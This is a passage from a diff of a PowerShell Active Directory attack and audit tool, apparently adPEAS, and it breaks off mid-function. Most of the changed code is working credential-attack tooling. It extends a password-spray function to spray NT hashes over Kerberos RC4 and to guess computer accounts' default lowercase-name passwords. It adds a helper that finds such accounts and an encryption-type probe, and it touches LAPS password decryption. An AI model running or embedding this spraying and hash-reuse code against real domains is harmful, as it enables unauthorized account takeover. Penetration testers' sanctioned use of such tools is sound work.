-                            } catch {
-                                throw $fullError
-                            }
-                        } else {
-                            throw
+                    $firstError = $null
+                    foreach ($attempt in $attempts) {
+                        try {
+                            Write-Log "[ConvertFrom-LAPSEncryptedPassword] Trying $($attempt.Label) ($($attempt.Data.Length) bytes)"
+                            $decryptedData = Invoke-NCryptUnprotectSecret -ProtectedBlob $attempt.Data
+                            break
+                        } catch {
+                            Write-Log "[ConvertFrom-LAPSEncryptedPassword] $($attempt.Label) failed: $($_.Exception.Message)"
+                            if ($null -eq $firstError) { $firstError = $_.Exception.Message }
                         }
                     }
+                    if ($null -eq $decryptedData -and $null -ne $firstError) { throw $firstError }
                     if ($decryptedData -and $decryptedData.Length -gt 0) {
                         $jsonString = [System.Text.Encoding]::Unicode.GetString($decryptedData)
                         $jsonString = $jsonString.TrimEnd([char]0)
@@ -44648,7 +45099,7 @@ function ConvertFrom-LAPSEncryptedPassword {
                                     if ($lapsData.t) {
                                         try {
                                             $fileTime = [Convert]::ToInt64($lapsData.t, 16)
-                                            $result.UpdateTimestamp = [DateTime]::FromFileTimeUtc($fileTime)
+                                            $result.UpdateTimestamp = [DateTime]::FromFileTime($fileTime)
                                         } catch {
                                             Write-Log "[ConvertFrom-LAPSEncryptedPassword] Failed to parse timestamp: $($lapsData.t)"
                                         }
@@ -44673,14 +45124,21 @@ function ConvertFrom-LAPSEncryptedPassword {
                     $errorMessage = $_.Exception.Message
                     Write-Log "[ConvertFrom-LAPSEncryptedPassword] Decryption failed: $errorMessage"
                     $result.DecryptionError = $errorMessage
-                    if ($errorMessage -match "0x8009310B") {
-                        $result.DecryptionError = "DPAPI-NG not supported - requires domain-joined system for LAPS v2 encrypted password decryption"
-                    } elseif ($errorMessage -match "0x8009002C") {
-                        $result.DecryptionError = "CMS format error - encrypted blob may be corrupted or incompatible"
-                    } elseif ($errorMessage -match "0x80090034" -or $errorMessage -match "NTE_DECRYPTION_FAILURE") {
-                        $result.DecryptionError = "Access denied - current user is not authorized to decrypt this password"
-                    } elseif ($errorMessage -match "0x80070005" -or $errorMessage -match "ACCESS_DENIED") {
-                        $result.DecryptionError = "Access denied - not a member of authorized group ($targetSIDName)"
+                    if ($errorMessage -match '0x[0-9A-Fa-f]{8}') {
+                        $errorCode = '0x' + $Matches[0].Substring(2).ToUpperInvariant()
+                        $errorName = switch ($errorCode) {
+                            '0x80070005' { 'E_ACCESSDENIED' }
+                            '0x80090029' { 'NTE_NOT_SUPPORTED' }
+                            '0x8009002C' { 'NTE_DECRYPTION_FAILURE' }
+                            '0x8009002D' { 'NTE_INTERNAL_ERROR' }
+                            '0x80090034' { 'NTE_ENCRYPTION_FAILURE' }
+                            '0x8009310B' { 'CRYPT_E_ASN1_BADTAG' }
+                            default      { $null }
+                        }
+                        $result.DecryptionError = if ($errorName) { "$errorName ($errorCode)" } else { "NCryptUnprotectSecret error $errorCode" }
+                    }
+                    if ((Test-adPEASHostDomainMember) -eq $false) {
+                        $result.DecryptionError = "$($result.DecryptionError) - this host is not domain-joined, and Windows only requests the key on a domain member"
                     }
                 }
             }
@@ -44689,6 +45147,82 @@ function ConvertFrom-LAPSEncryptedPassword {
             Write-Log "[ConvertFrom-LAPSEncryptedPassword] Error: $_"
             return $null
         }
+    }
+}
+function Get-LAPSDecryptorName {
+    [CmdletBinding()]
+    [OutputType([string])]
+    param(
+        [Parameter(Mandatory = $true)]
+        [AllowNull()]
+        $Info
+    )
+    if (-not $Info) { return $null }
+    if ($Info.TargetSIDName) { return [string]$Info.TargetSIDName }
+    if ($Info.TargetSID) { return [string]$Info.TargetSID }
+    return $null
+}
+function Format-LAPSEncryptedValue {
+    [CmdletBinding()]
+    [OutputType([string])]
+    param(
+        [Parameter(Mandatory = $true)]
+        [AllowNull()]
+        $Info,
+        [Parameter(Mandatory = $true)]
+        [int]$Length
+    )
+    $decryptor = Get-LAPSDecryptorName -Info $Info
+    $for = if ($decryptor) { " for $decryptor" } else { '' }
+    if ($Info -and $Info.UpdateTimestamp) {
+        return "[Encrypted$for - Updated: $(Format-adPEASDate $Info.UpdateTimestamp 'yyyy-MM-dd HH:mm:ss')]"
+    }
+    return "[Encrypted$for - $Length bytes]"
+}
+function Get-adPEASHostJoinStatus {
+    [CmdletBinding()]
+    param()
+    $netJoinSignature = @"
+using System;
+using System.Runtime.InteropServices;
+
+public class adPEASNetJoin
+{
+    [DllImport("netapi32.dll", CharSet = CharSet.Unicode)]
+    public static extern int NetGetJoinInformation(string server, out IntPtr nameBuffer, out int bufferType);
+
+    [DllImport("netapi32.dll")]
+    public static extern int NetApiBufferFree(IntPtr buffer);
+}
+"@
+    try {
+        if (-not ([System.Management.Automation.PSTypeName]'adPEASNetJoin').Type) {
+            Add-Type -TypeDefinition $netJoinSignature -Language CSharp -ErrorAction Stop
+        }
+        $nameBuffer = [IntPtr]::Zero
+        $bufferType = 0
+        $status = [adPEASNetJoin]::NetGetJoinInformation($null, [ref]$nameBuffer, [ref]$bufferType)
+        if ($nameBuffer -ne [IntPtr]::Zero) { $null = [adPEASNetJoin]::NetApiBufferFree($nameBuffer) }
+        if ($status -ne 0) {
+            Write-Log "[Get-adPEASHostJoinStatus] NetGetJoinInformation failed: $status"
+            return $null
+        }
+        return [int]$bufferType
+    } catch {
+        Write-Log "[Get-adPEASHostJoinStatus] Join status not readable: $_"
+        return $null
+    }
+}
+function Test-adPEASHostDomainMember {
+    [CmdletBinding()]
+    param()
+    $joinStatus = Get-adPEASHostJoinStatus
+    if ($null -eq $joinStatus) { return $null }
+    switch ([int]$joinStatus) {
+        3 { return $true }
+        1 { return $false }
+        2 { return $false }
+        default { return $null }
     }
 }
 function Parse-CMSEnvelopedData {
@@ -45265,13 +45799,14 @@ function ConvertFrom-TSClientLicense {
     $version  = [BitConverter]::ToUInt32($Bytes, 0)
     $fileTime = [BitConverter]::ToInt64($Bytes, 4)
     $issued = $null
-    try { $issued = [DateTime]::FromFileTimeUtc($fileTime) } catch { return $null }
-    if ($issued.Year -lt 2005 -or $issued.Year -gt 2099) { return $null }
+    try { $issued = [DateTime]::FromFileTime($fileTime) } catch { return $null }
+    $issuedYear = $issued.ToUniversalTime().Year
+    if ($issuedYear -lt 2005 -or $issuedYear -gt 2099) { return $null }
     $strBytes  = $Bytes[12..($Bytes.Length - 1)]
     $productId = [System.Text.Encoding]::Unicode.GetString($strBytes).TrimEnd([char]0)
     $lines = @()
     $lines += ("Version = 0x{0:X8}" -f $version)
-    $lines += ("Issued = {0:yyyy-MM-dd HH:mm:ss} UTC" -f $issued)
+    $lines += ("Issued = " + (Format-adPEASDate $issued 'yyyy-MM-dd HH:mm:ss'))
     if ($productId) { $lines += "ProductID = '$productId'" }
     return ,$lines
 }
@@ -45624,6 +46159,7 @@ function Get-adPEASSession {
             if ($Script:LDAPContext.SessionStartTime) {
                 $sessionDuration = (Get-Date) - $Script:LDAPContext.SessionStartTime
                 Show-KeyValue "Session Started:" (Format-adPEASDate $Script:LDAPContext.SessionStartTime 'yyyy-MM-dd HH:mm:ss')
+                Show-KeyValue "Time Zone:" (Get-adPEASTimeZoneLabel $Script:LDAPContext.SessionStartTime)
                 Show-KeyValue "Session Duration:" ('{0:00}:{1:mm\:ss}' -f [Math]::Floor($sessionDuration.TotalHours), $sessionDuration)
             }
             if ($Script:LDAPContext.KerberosUsed) {
@@ -46411,6 +46947,48 @@ function Convert-ADTimestamp {
         Write-Log "[Convert-ADTimestamp] Error converting timestamp: $_"
     }
     return $null
+}
+function Get-ComputerInitialPasswordCandidate {
+    [CmdletBinding()]
+    param(
+        [Parameter(Mandatory=$false)]
+        [string]$Domain,
+        [Parameter(Mandatory=$false)]
+        [string]$Server,
+        [Parameter(Mandatory=$false)]
+        [System.Management.Automation.PSCredential]$Credential
+    )
+    $candidates = @(Get-DomainComputer -Enabled -LDAPFilter '(&(!(operatingSystem=*))(!(dNSHostName=*)))' @PSBoundParameters)
+    $creationWindowSeconds = 300
+    foreach ($computer in $candidates) {
+        $pwdLastSet = $computer.pwdLastSet
+        $uacFlags = @($computer.userAccountControl)
+        if ($pwdLastSet -isnot [datetime]) {
+            if ([string]@($pwdLastSet)[0] -eq '0' -and $uacFlags -contains 'PASSWD_NOTREQD') {
+                $computer | Add-Member -NotePropertyName 'passwordSinceCreation' -NotePropertyValue 'Never set - empty password' -Force
+                $computer
+            }
+            continue
+        }
+        $created = $computer.whenCreated
+        if ($created -isnot [datetime]) { continue }
+        $secondsAfterCreation = ($pwdLastSet.ToUniversalTime() - $created.ToUniversalTime()).TotalSeconds
+        if ([Math]::Abs($secondsAfterCreation) -gt $creationWindowSeconds) { continue }
+        $verdict = if ($computer.lastLogonTimestamp -is [datetime]) { 'Unchanged, in use' } else { 'Unchanged, never used' }
+        $computer | Add-Member -NotePropertyName 'passwordSinceCreation' -NotePropertyValue $verdict -Force
+        $computer
+    }
+}
+function Get-ComputerDefaultPassword {
+    [CmdletBinding()]
+    [OutputType([string])]
+    param(
+        [Parameter(Mandatory = $true, Position = 0)]
+        [string]$SamAccountName
+    )
+    $name = $SamAccountName.Trim().TrimEnd('$').ToLowerInvariant()
+    if ($name.Length -gt 14) { $name = $name.Substring(0, 14) }
+    return $name
 }
 if (-not $Script:SMBShareAccessCache) {
     $Script:SMBShareAccessCache = @{}
@@ -52438,7 +53016,9 @@ function Invoke-KerberosAuth {
         [Parameter(Mandatory=$false)]
         [switch]$NoPAC,
         [Parameter(Mandatory=$false)]
-        [switch]$OutputTicketOnly
+        [switch]$OutputTicketOnly,
+        [Parameter(Mandatory=$false)]
+        [switch]$ETypeProbe
     )
     begin {
         Write-Log "[Invoke-KerberosAuth] Starting unified Kerberos authentication..."
@@ -52456,6 +53036,9 @@ function Invoke-KerberosAuth {
             throw "You can only provide one authentication method at a time. Provided: $($authMethods -join ', ')"
         }
         $AuthMethodType = $authMethods[0]
+        if ($ETypeProbe -and $AuthMethodType -eq 'Certificate') {
+            throw "-ETypeProbe needs a password, NT hash or key - PKINIT negotiates its encryption type differently"
+        }
         $CustomDnsServer = $null
         if ($Script:LDAPContext -and $Script:LDAPContext['DnsServer']) {
             $CustomDnsServer = $Script:LDAPContext['DnsServer']
@@ -53049,6 +53632,29 @@ function Invoke-KerberosAuth {
                 }
             }
             Write-Log "[Invoke-KerberosAuth] $AuthMethod for $UserName@$realmUpper via $DomainController (etype $EType)"
+            if ($ETypeProbe) {
+                $probeRequest = New-KerberosASREQ -UserName $UserName -Realm $Domain -EType $EType -NoPreAuth
+                $probeResponseBytes = Send-KerberosRequest -Server $DomainController -Request $probeRequest.ASReq
+                $probeAnswer = Parse-ASREP -Data $probeResponseBytes
+                $eTypeAccepted = $null
+                if ($probeAnswer.Success -or $probeAnswer.ErrorCode -eq 25) {
+                    $eTypeAccepted = $true
+                } elseif ($probeAnswer.ErrorCode -eq 14) {
+                    $eTypeAccepted = $false
+                }
+                Write-Log "[Invoke-KerberosAuth] etype $EType probe for $UserName : accepted=$eTypeAccepted ($($probeAnswer.Error))"
+                return [PSCustomObject]@{
+                    Probe            = $true
+                    ETypeAccepted    = $eTypeAccepted
+                    EncryptionType   = $EType
+                    Method           = $AuthMethod
+                    UserName         = $UserName
+                    Domain           = $realmUpper
+                    DomainController = $DomainController
+                    ErrorCode        = $probeAnswer.ErrorCode
+                    Error            = $probeAnswer.Error
+                }
+            }
             $UseKDCSalt = ($AuthMethodType -in @("Credential", "Password")) -and ($EType -in @(17, 18))
             if ($UseKDCSalt) {
                 Write-Log "[Invoke-KerberosAuth] Requesting salt from KDC (AS-REQ without preauth)..."
@@ -57476,6 +58082,7 @@ function Get-LAPSSchemaPresence {
         $legacyPresent = $false
         $nativePresent = $false
         $passwordConfidential = $null
+        $attributeGUIDs = @{}
         $schemaDN = $Script:LDAPContext.SchemaNamingContext
         if ($schemaDN) {
             try {
@@ -57509,6 +58116,19 @@ function Get-LAPSSchemaPresence {
             } catch {
                 Write-Log "[Get-LAPSSchemaPresence] Schema query error: $($_.Exception.Message)"
             }
+            if ($legacyPresent -or $nativePresent) {
+                try {
+                    $guidFilter = "(&(objectClass=attributeSchema)(|(lDAPDisplayName=ms-Mcs-AdmPwd*)(lDAPDisplayName=msLAPS-*)))"
+                    foreach ($lapsAttribute in @(Get-DomainObject -LDAPFilter $guidFilter -SearchBase $schemaDN -Properties 'lDAPDisplayName', 'schemaIDGUID' -Raw @connectionParams)) {
+                        $attributeName = [string]$lapsAttribute.lDAPDisplayName
+                        $attributeGuid = ConvertTo-WriteAccessGuid -Value $lapsAttribute.schemaIDGUID
+                        if ($attributeName -and $attributeGuid) { $attributeGUIDs[$attributeName] = $attributeGuid }
+                    }
+                    Write-Log "[Get-LAPSSchemaPresence] schemaIDGUIDs read for $($attributeGUIDs.Count) LAPS attribute(s)"
+                } catch {
+                    Write-Log "[Get-LAPSSchemaPresence] LAPS schemaIDGUID query error: $($_.Exception.Message)"
+                }
+            }
         }
         if (-not $legacyPresent -and -not $nativePresent) {
             Write-Log "[Get-LAPSSchemaPresence] Schema partition gave no answer, probing computer objects"
@@ -57533,6 +58153,7 @@ function Get-LAPSSchemaPresence {
             LegacyPresent        = $legacyPresent
             NativePresent        = $nativePresent
             PasswordConfidential = $passwordConfidential
+            AttributeGUIDs       = $attributeGUIDs
         }
         return $Script:LAPSSchemaInfo
     }
@@ -60016,6 +60637,15 @@ function Get-OUPermissions {
                 $_.AccessControlType -eq [System.Security.AccessControl.AccessControlType]::Deny
             })
             $neutralisedByDeny = 0
+            $LAPSAttributeGUIDs = @{}
+            if ($CheckType -contains 'LAPS') {
+                try {
+                    $lapsSchema = Get-LAPSSchemaPresence
+                    if ($lapsSchema -and $lapsSchema.AttributeGUIDs) { $LAPSAttributeGUIDs = $lapsSchema.AttributeGUIDs }
+                } catch {
+                    Write-Log "[Get-OUPermissions] LAPS attribute GUIDs not available: $_"
+                }
+            }
             $Findings = @()
             if ($CheckType -contains 'Ownership' -and $sdParsed.OwnerSID) {
                 if (-not (Test-IsDefaultOwner -SID $sdParsed.OwnerSID)) {
@@ -60441,7 +61071,7 @@ function Get-OUPermissions {
                         $lapsIsAllProperties = $IsAllProperties
                         $lapsPropertyFound = $false
                         $lapsGrantsControlAccess = ($HasGenericAll -or $HasExtendedRight)
-                        $legacyLAPSMatch = ($ACE.ObjectType -and $ACE.ObjectType.Guid -eq $PropertyGUIDs['ms-Mcs-AdmPwd'].Guid)
+                        $legacyLAPSMatch = ($ACE.ObjectType -and $ACE.ObjectType.Guid -eq $LAPSAttributeGUIDs['ms-Mcs-AdmPwd'])
                         if ($legacyLAPSMatch) {
                             $Severity = if ($IsPrivileged) { "Info" } else { "Medium" }
                             $Findings += [PSCustomObject]@{
@@ -60455,7 +61085,7 @@ function Get-OUPermissions {
                             }
                             $lapsPropertyFound = $true
                         }
-                        $encPwdMatch = ($ACE.ObjectType -and $ACE.ObjectType.Guid -eq $PropertyGUIDs['msLAPS-EncryptedPassword'].Guid)
+                        $encPwdMatch = ($ACE.ObjectType -and $ACE.ObjectType.Guid -eq $LAPSAttributeGUIDs['msLAPS-EncryptedPassword'])
                         if ($encPwdMatch) {
                             $Severity = if ($IsPrivileged) { "Info" } else { "Medium" }
                             $Findings += [PSCustomObject]@{
@@ -60469,7 +61099,7 @@ function Get-OUPermissions {
                             }
                             $lapsPropertyFound = $true
                         }
-                        $encHistMatch = ($ACE.ObjectType -and $ACE.ObjectType.Guid -eq $PropertyGUIDs['msLAPS-EncryptedPasswordHistory'].Guid)
+                        $encHistMatch = ($ACE.ObjectType -and $ACE.ObjectType.Guid -eq $LAPSAttributeGUIDs['msLAPS-EncryptedPasswordHistory'])
                         if ($encHistMatch) {
                             $Severity = if ($IsPrivileged) { "Info" } else { "Medium" }
                             $Findings += [PSCustomObject]@{
@@ -60483,7 +61113,7 @@ function Get-OUPermissions {
                             }
                             $lapsPropertyFound = $true
                         }
-                        $plainPwdMatch = ($ACE.ObjectType -and $ACE.ObjectType.Guid -eq $PropertyGUIDs['msLAPS-Password'].Guid)
+                        $plainPwdMatch = ($ACE.ObjectType -and $ACE.ObjectType.Guid -eq $LAPSAttributeGUIDs['msLAPS-Password'])
                         if ($plainPwdMatch) {
                             $Severity = if ($IsPrivileged) { "Info" } else { "Medium" }
                             $Findings += [PSCustomObject]@{
@@ -60497,7 +61127,7 @@ function Get-OUPermissions {
                             }
                             $lapsPropertyFound = $true
                         }
-                        $versionMatch = ($ACE.ObjectType -and $ACE.ObjectType.Guid -eq $PropertyGUIDs['msLAPS-CurrentPasswordVersion'].Guid)
+                        $versionMatch = ($ACE.ObjectType -and $ACE.ObjectType.Guid -eq $LAPSAttributeGUIDs['msLAPS-CurrentPasswordVersion'])
                         if ($versionMatch) {
                             $Severity = if ($IsPrivileged) { "Info" } else { "Low" }
                             $Findings += [PSCustomObject]@{
@@ -60511,7 +61141,7 @@ function Get-OUPermissions {
                             }
                             $lapsPropertyFound = $true
                         }
-                        $expTimeMatch = ($ACE.ObjectType -and $ACE.ObjectType.Guid -eq $PropertyGUIDs['msLAPS-PasswordExpirationTime'].Guid)
+                        $expTimeMatch = ($ACE.ObjectType -and $ACE.ObjectType.Guid -eq $LAPSAttributeGUIDs['msLAPS-PasswordExpirationTime'])
                         if ($expTimeMatch) {
                             $Severity = if ($IsPrivileged) { "Info" } else { "Low" }
                             $Findings += [PSCustomObject]@{
@@ -66361,7 +66991,7 @@ function Invoke-ShadowCredentialOperation {
                                 if ($EntryData.Length -eq 8) {
                                     $FileTime = [BitConverter]::ToInt64($EntryData, 0)
                                     if ($FileTime -gt 0) {
-                                        $ParsedCred.CreationTime = [DateTime]::FromFileTimeUtc($FileTime)
+                                        $ParsedCred.CreationTime = [DateTime]::FromFileTime($FileTime)
                                     }
                                 }
                             }
@@ -70517,6 +71147,10 @@ function Invoke-PasswordSpray {
         [Parameter(Mandatory=$false)]
         [object]$PasswordList,
         [Parameter(Mandatory=$false)]
+        [string]$NTHash,
+        [Parameter(Mandatory=$false)]
+        [object]$NTHashList,
+        [Parameter(Mandatory=$false)]
         [string]$Domain,
         [Parameter(Mandatory=$false)]
         [string]$Server,
@@ -70531,23 +71165,37 @@ function Invoke-PasswordSpray {
         [Parameter(Mandatory=$false)]
         [switch]$Force,
         [Parameter(Mandatory=$false)]
-        [string]$OutputFile
+        [string]$OutputFile,
+        [Parameter(Mandatory=$false)]
+        [switch]$ComputerDefault
     )
     begin {
         $abortRun = $false
-        if (-not $Password -and -not $PasswordList) {
-            Write-Error "You must specify either -Password or -PasswordList"
+        $secretSources = @()
+        if ($Password)        { $secretSources += '-Password' }
+        if ($PasswordList)    { $secretSources += '-PasswordList' }
+        if ($NTHash)          { $secretSources += '-NTHash' }
+        if ($NTHashList)      { $secretSources += '-NTHashList' }
+        if ($ComputerDefault) { $secretSources += '-ComputerDefault' }
+        if ($secretSources.Count -eq 0) {
+            Write-Error "You must specify one of -Password, -PasswordList, -NTHash, -NTHashList or -ComputerDefault"
             $abortRun = $true; return
         }
-        if ($Password -and $PasswordList) {
-            Write-Error "Cannot specify both -Password and -PasswordList. Choose one."
+        if ($secretSources.Count -gt 1) {
+            Write-Error "Specify only one of -Password, -PasswordList, -NTHash, -NTHashList or -ComputerDefault - got $($secretSources -join ', ')."
             $abortRun = $true; return
         }
+        $secretKind = if ($NTHash -or $NTHashList) { 'NTHash' } else { 'Password' }
+        $secretLabel       = if ($secretKind -eq 'NTHash') { 'NT-Hash' }   else { 'password' }
+        $secretLabelPlural = if ($secretKind -eq 'NTHash') { 'NT-Hashes' } else { 'passwords' }
+        $accountNoun = if ($ComputerDefault) { 'candidate computer accounts' } else { 'enabled users' }
         $connectionParams = @{}
         if ($Domain) { $connectionParams['Domain'] = $Domain }
         if ($Server) { $connectionParams['Server'] = $Server }
         if ($Credential) { $connectionParams['Credential'] = $Credential }
         $usernames = @()
+        $lockoutThreshold = 0
+        $initialBadPwdCount = @{}
         if ($Auto) {
             if (-not (Ensure-LDAPConnection @connectionParams)) {
                 Write-Error "Auto mode requires an active LDAP connection. Use Connect-adPEAS first."
@@ -70594,13 +71242,28 @@ function Invoke-PasswordSpray {
                 Write-Host "    Unknown - the policy could not be read" -ForegroundColor Red
             }
             Write-Host ""
-            Write-Host "[*] Fetching all enabled users from domain..." -ForegroundColor Cyan
-            $enabledUsers = Get-DomainUser -LDAPFilter "(!userAccountControl:1.2.840.113556.1.4.803:=2)" @connectionParams
-            if (-not $enabledUsers) {
-                Write-Error "No enabled users found in domain"
-                $abortRun = $true; return
+            if ($ComputerDefault) {
+                Write-Host "[*] Fetching computer accounts that still carry their creation password..." -ForegroundColor Cyan
+                $candidates = @(Get-ComputerInitialPasswordCandidate @connectionParams)
+                $noPasswordCount = @($candidates | Where-Object { $_.passwordSinceCreation -eq 'Never set - empty password' }).Count
+                $enabledUsers = @($candidates | Where-Object { $_.passwordSinceCreation -like 'Unchanged*' })
+                if ($noPasswordCount -gt 0) {
+                    Write-Host "[*] $noPasswordCount computer account(s) never had a password set - not tested (no Kerberos keys; see Get-ComputerInitialPassword)" -ForegroundColor Yellow
+                }
+                if ($enabledUsers.Count -eq 0) {
+                    Write-Error "No computer account whose password may still be the default"
+                    $abortRun = $true; return
+                }
+                Write-Host "[+] Found $($enabledUsers.Count) computer account(s) whose password dates from their creation" -ForegroundColor Green
+            } else {
+                Write-Host "[*] Fetching all enabled users from domain..." -ForegroundColor Cyan
+                $enabledUsers = Get-DomainUser -LDAPFilter "(!userAccountControl:1.2.840.113556.1.4.803:=2)" @connectionParams
+                if (-not $enabledUsers) {
+                    Write-Error "No enabled users found in domain"
+                    $abortRun = $true; return
+                }
+                Write-Host "[+] Found $($enabledUsers.Count) enabled users" -ForegroundColor Green
             }
-            Write-Host "[+] Found $($enabledUsers.Count) enabled users" -ForegroundColor Green
             $skippedUsers = @()
             $safeUsers = @()
             if ($lockoutThreshold -gt 0) {
@@ -70619,6 +71282,7 @@ function Invoke-PasswordSpray {
                         }
                     } else {
                         $safeUsers += $user.sAMAccountName
+                        $initialBadPwdCount[[string]$user.sAMAccountName] = $badPwdCount
                     }
                 }
                 if ($skippedUsers.Count -gt 0) {
@@ -70634,52 +71298,79 @@ function Invoke-PasswordSpray {
                     Write-Error "No safe users to test - all accounts are close to lockout threshold"
                     $abortRun = $true; return
                 }
-                Write-Host "[+] Safe to test: $($usernames.Count) users (skipped: $($skippedUsers.Count))" -ForegroundColor Green
+                Write-Host "[+] Safe to test: $($usernames.Count) $accountNoun (skipped: $($skippedUsers.Count))" -ForegroundColor Green
                 Write-Host ""
             } else {
                 if ($lockoutPolicyRead) {
-                    Write-Host "[*] Domain has no lockout policy configured - testing all enabled users" -ForegroundColor Yellow
+                    Write-Host "[*] Domain has no lockout policy configured - testing all $accountNoun" -ForegroundColor Yellow
                 } else {
-                    Write-Host "[!] Lockout policy unknown - testing all enabled users WITHOUT lockout protection" -ForegroundColor Red
+                    Write-Host "[!] Lockout policy unknown - testing all $accountNoun WITHOUT lockout protection" -ForegroundColor Red
                 }
                 Write-Host ""
                 $usernames = $enabledUsers | ForEach-Object { $_.sAMAccountName }
             }
         } elseif ($UserList -is [string]) {
-            if (Test-Path $UserList) {
-                $usernames = Get-Content -Path $UserList | Where-Object { $_ -and $_.Trim() }
-            } else {
+            if (Test-Path -LiteralPath $UserList -PathType Leaf) {
+                $usernames = Get-Content -LiteralPath $UserList | Where-Object { $_ -and $_.Trim() }
+            } elseif ($UserList -match '\.(txt|lst|list|csv)\s*$') {
                 Write-Error "User list file not found: $UserList"
                 $abortRun = $true; return
+            } else {
+                $usernames = @($UserList -split ',' | ForEach-Object { $_.Trim() } | Where-Object { $_ })
             }
         } elseif ($UserList -is [array]) {
             $usernames = $UserList
         } else {
             $usernames = @($UserList)
         }
-        $passwords = @()
-        if ($Password) {
-            $passwords = @($Password)
+        $secrets = @()
+        if ($ComputerDefault) {
+            $secrets = @('(computer name in lowercase)')
+        } elseif ($Password) {
+            $secrets = @($Password)
+        } elseif ($NTHash) {
+            $secrets = @($NTHash)
         } else {
-            if ($PasswordList -is [string]) {
-                if (Test-Path $PasswordList) {
-                    $passwords = Get-Content -Path $PasswordList | Where-Object { $_ -and $_.Trim() }
+            $secretList     = if ($secretKind -eq 'NTHash') { $NTHashList } else { $PasswordList }
+            $secretListName = if ($secretKind -eq 'NTHash') { 'NT-Hash' }   else { 'Password' }
+            if ($secretList -is [string]) {
+                if (Test-Path $secretList) {
+                    $secrets = Get-Content -Path $secretList | Where-Object { $_ -and $_.Trim() }
                 } else {
-                    Write-Error "Password list file not found: $PasswordList"
+                    Write-Error "$secretListName list file not found: $secretList"
                     $abortRun = $true; return
                 }
-            } elseif ($PasswordList -is [array]) {
-                $passwords = $PasswordList
+            } elseif ($secretList -is [array]) {
+                $secrets = $secretList
             }
+        }
+        if ($secretKind -eq 'NTHash') {
+            $secrets = @($secrets | ForEach-Object { ([string]$_).Trim() } | Where-Object { $_ })
+            for ($i = 0; $i -lt $secrets.Count; $i++) {
+                if ($secrets[$i] -notmatch '^[0-9a-fA-F]{32}$') {
+                    Write-Error "NT-Hash entry $($i + 1) is not an NT hash (expected 32 hex characters, got $($secrets[$i].Length)): $($secrets[$i])"
+                    $abortRun = $true; return
+                }
+            }
+        }
+        $usernames = @($usernames | ForEach-Object {
+            $accountName = ([string]$_).Trim()
+            if ($accountName -match '\\') { $accountName.Split('\')[1] }
+            elseif ($accountName -match '@') { $accountName.Split('@')[0] }
+            else { $accountName }
+        } | Where-Object { $_ })
+        if ($ComputerDefault) {
+            $usernames = @($usernames | ForEach-Object { if ($_.EndsWith('$')) { $_ } else { "$_`$" } })
         }
         if ($usernames.Count -eq 0) {
             Write-Error "No usernames to test"
             $abortRun = $true; return
         }
-        if ($passwords.Count -eq 0) {
-            Write-Error "No passwords to test"
+        if (@($secrets).Count -eq 0) {
+            Write-Error "No $secretLabelPlural to test"
             $abortRun = $true; return
         }
+        $secrets = @($secrets)
         $targetDomain = $Domain
         if (-not $targetDomain -and $Script:LDAPContext) {
             $targetDomain = $Script:LDAPContext.Domain
@@ -70688,18 +71379,60 @@ function Invoke-PasswordSpray {
             Write-Error "No domain specified and no active session. Use -Domain parameter or Connect-adPEAS first."
             $abortRun = $true; return
         }
-        if ($passwords.Count -gt 1 -and $Delay -lt 500) {
-            Write-Warning "Testing multiple passwords with low/no delay increases lockout risk!"
-            Write-Warning "Consider using -Delay 1000 or higher when testing multiple passwords."
+        $rc4RefusedCount = 0
+        if ($secretKind -eq 'NTHash') {
+            Write-Host "[*] Checking whether the KDC accepts RC4-HMAC for these accounts (no logon attempt)..." -ForegroundColor Cyan
+            $rc4Accepted = @()
+            foreach ($username in $usernames) {
+                $probeParams = @{
+                    UserName    = $username
+                    Domain      = $targetDomain
+                    NTHash      = $secrets[0]
+                    ETypeProbe  = $true
+                    ErrorAction = 'SilentlyContinue'
+                }
+                if ($Server) { $probeParams['DomainController'] = $Server }
+                $probe = $null
+                try { $probe = Invoke-KerberosAuth @probeParams } catch {
+                    Write-Verbose "[-] RC4 check failed for ${username}@${targetDomain}: $_"
+                }
+                if ($probe -and $probe.ETypeAccepted -eq $false) {
+                    $rc4RefusedCount++
+                    Write-Verbose "[-] RC4-HMAC refused: ${username}@${targetDomain} - $($probe.Error)"
+                } else {
+                    $rc4Accepted += $username
+                }
+            }
+            if ($rc4Accepted.Count -eq 0) {
+                Write-Host "[!] The KDC refuses RC4-HMAC for all $rc4RefusedCount account(s) - an NT hash cannot be tested here (KDC_ERR_ETYPE_NOSUPP)" -ForegroundColor Red
+                $abortRun = $true; return
+            }
+            if ($rc4RefusedCount -gt 0) {
+                Write-Host "[!] The KDC refuses RC4-HMAC for $rc4RefusedCount of $($usernames.Count) account(s) - they are left out" -ForegroundColor Yellow
+            }
+            Write-Host ""
+            $usernames = $rc4Accepted
+        }
+        if ($secrets.Count -gt 1 -and $Delay -lt 500) {
+            Write-Warning "Testing multiple $secretLabelPlural with low/no delay increases lockout risk!"
+            Write-Warning "Consider using -Delay 1000 or higher when testing multiple $secretLabelPlural."
         }
         Write-Host "[*] Password Spray Configuration:" -ForegroundColor Cyan
         Write-Host "    Domain:          $targetDomain"
         if ($Server) {
             Write-Host "    DC:              $Server"
         }
-        Write-Host "    Users:           $($usernames.Count)"
-        Write-Host "    Passwords:       $($passwords.Count)"
-        Write-Host "    Total Attempts:  $($usernames.Count * $passwords.Count)"
+        $usersLine = "    Users:           $($usernames.Count)"
+        if ($rc4RefusedCount -gt 0) { $usersLine += " ($rc4RefusedCount left out - KDC refused RC4)" }
+        Write-Host $usersLine
+        if ($secretKind -eq 'NTHash') {
+            Write-Host "    NT-Hashes:       $($secrets.Count) (RC4-HMAC)"
+        } elseif ($ComputerDefault) {
+            Write-Host "    Passwords:       computer name in lowercase, one per account"
+        } else {
+            Write-Host "    Passwords:       $($secrets.Count)"
+        }
+        Write-Host "    Total Attempts:  $($usernames.Count * $secrets.Count)"
         Write-Host "    Delay:           ${Delay}ms" -NoNewline
         if ($Jitter -gt 0) {
             Write-Host " (+/- ${Jitter}%)" -ForegroundColor Yellow
@@ -70710,24 +71443,32 @@ function Invoke-PasswordSpray {
         $successfulCreds = @()
         $totalAttempts = 0
         $successCount = 0
+        $notTestedCount = 0
+        $rc4RefusedValidCount = 0
+        $finishedAccounts = @{}
+        $runFailures = @{}
+        function New-UnrelatedNTHash {
+            $randomBytes = New-Object byte[] 16
+            $rng = [System.Security.Cryptography.RandomNumberGenerator]::Create()
+            try { $rng.GetBytes($randomBytes) } finally { $rng.Dispose() }
+            ($randomBytes | ForEach-Object { $_.ToString('X2') }) -join ''
+        }
         $startTime = Get-Date
     }
     process {
         if ($abortRun) { return }
-        foreach ($pass in $passwords) {
-            if ($passwords.Count -gt 1) {
